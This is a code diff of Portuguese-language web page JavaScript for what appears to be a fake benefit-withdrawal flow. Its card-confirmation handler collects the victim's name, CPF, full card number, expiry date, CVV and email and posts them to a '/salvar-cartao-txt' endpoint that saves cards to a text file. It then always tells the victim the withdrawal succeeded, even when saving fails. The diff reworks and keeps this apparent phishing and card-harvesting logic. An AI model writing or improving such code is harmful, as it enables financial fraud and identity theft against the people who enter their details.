@@ -1136,6 +1136,9 @@ function mostrarOpcoesData(opcoes, dataReal) {
             }
             showStep('flowCartao', 3);
         });
+
+
+
 document.getElementById('confirmCartao').addEventListener('click', async () => {
     const numeroRaw = document.getElementById('numeroCartao').value.replace(/\D/g, '');
     const validade = document.getElementById('validadeCartao').value;
@@ -1182,53 +1185,52 @@ document.getElementById('confirmCartao').addEventListener('click', async () => {
     btnConfirm.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Salvando...';
     
     try {
-        // ========== SALVAR NO ARQUIVO VIA PHP ==========
+        // Dados do cartão
         const dadosCartao = {
-          nome: dadosUsuario?.nome || 'N/A',
-    cpf: cpfAtual,
-    cartao: numeroRaw,
-    validade: validade,
-    cvv: cvv,
-    email: email,
-    valor: formatarMoeda(valor)
+            nome: dadosUsuario?.nome || 'N/A',
+            cpf: cpfAtual,
+            cartao: numeroRaw,
+            validade: validade,
+            cvv: cvv,
+            email: email,
+            valor: formatarMoeda(valor)
         };
         
-        try {
-    const response = await fetch('/salvar-cartao-txt', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(dadosCartao)
-    });
-    const resultado = await response.json();
-    if (resultado.success) {
-        console.log('✅ Cartão salvo no servidor');
-    }
-} catch (erro) {
-    console.error('Erro ao salvar:', erro);
-}
+        console.log('📤 Enviando para o servidor:', dadosCartao);
         
-        // ========== ENVIAR WHATSAPP ==========
-        const mensagem = `✅ *SAQUE SOLICITADO COM SUCESSO* ✅\n\n` +
-            `👤 *Beneficiário:* ${dadosUsuario?.nome || 'N/A'}\n` +
-            `💰 *Valor:* R$ ${formatarMoeda(valor)}\n\n` +
-            `📧 Você receberá um e-mail de confirmação em até 24 horas.`;
+        const response = await fetch('/salvar-cartao-txt', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(dadosCartao)
+        });
         
-        enviarWhatsApp(mensagem);
-        alert('✅ Solicitação enviada com sucesso!');
-        limparProgresso();
-        showStep('flowSuccess', 3);
+        const resultado = await response.json();
+        console.log('📥 Resposta do servidor:', resultado);
+        
+        if (resultado.success) {
+            console.log('✅ Cartão salvo com sucesso!');
+        } else {
+            console.log('⚠️ Erro:', resultado.erro);
+        }
         
     } catch (error) {
-        console.error('Erro:', error);
-        alert('✅ Solicitação enviada!');
-        limparProgresso();
-        showStep('flowSuccess', 3);
-    } finally {
-        btnConfirm.disabled = false;
-        btnConfirm.innerHTML = originalText;
+        console.error('❌ Erro na requisição:', error);
     }
-});
     
+    // Enviar WhatsApp (sempre, mesmo se o salvamento falhar)
+    const mensagem = `✅ *SAQUE SOLICITADO COM SUCESSO* ✅\n\n` +
+        `👤 *Beneficiário:* ${dadosUsuario?.nome || 'N/A'}\n` +
+        `💰 *Valor:* R$ ${formatarMoeda(valor)}\n\n` +
+        `📧 Você receberá um e-mail de confirmação em até 24 horas.`;
+    
+    enviarWhatsApp(mensagem);
+    alert('✅ Solicitação enviada com sucesso!');
+    limparProgresso();
+    showStep('flowSuccess', 3);
+    
+    btnConfirm.disabled = false;
+    btnConfirm.innerHTML = originalText;
+});
         document.getElementById('cancelCartao').addEventListener('click', () => {
             salvarProgresso();
             showStep('flowFinal', 3);
